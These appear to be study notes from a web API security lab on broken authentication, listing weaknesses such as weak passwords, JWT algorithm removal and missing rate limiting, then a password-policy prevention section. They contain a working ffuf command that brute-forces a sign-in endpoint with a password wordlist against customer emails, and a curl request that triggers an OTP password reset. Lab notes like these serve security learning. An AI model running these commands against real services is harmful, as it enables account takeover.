- passwords are weak
- auth tokens are weak and guessable
- JWT algorithm can be removed
- kido JWT Attack
- MFA can be bruteforced
- lack of ratelimiting

## Pass Bruting
```shell
$ ffuf -w /opt/useful/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -w customerEmails.txt:EMAIL -u http://94.237.59.63:31874/api/v1/authentication/customers/sign-in -X POST -H "Content-Type: application/json" -d '{"Email": "EMAIL", "Password": "PASS"}' -fr "Invalid Credentials" -t 100
```
```bash
curl -X 'POST' \
  'http://94.237.123.236:54386/api/v1/authentication/customers/passwords/resets/email-otps' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "Email": "MasonJenkins@ymail.com"
}'
```



## Prevention

the web API should enforce a robust password policy for user credentials (including customers and suppliers) during both registration and updates, allowing only cryptographically secure passwords. This policy should include:

1. `Minimum password length` (e.g., at least 12 characters)
2. `Complexity requirements` (e.g., a mix of uppercase and lowercase letters, numbers, and special characters)
3. `Prohibition of commonly used or easily guessable passwords` (such as ones found in leaked password databases)
4. `Enforcement of password history to prevent reuse of recent passwords`
5. `Regular password expiration and mandatory changes`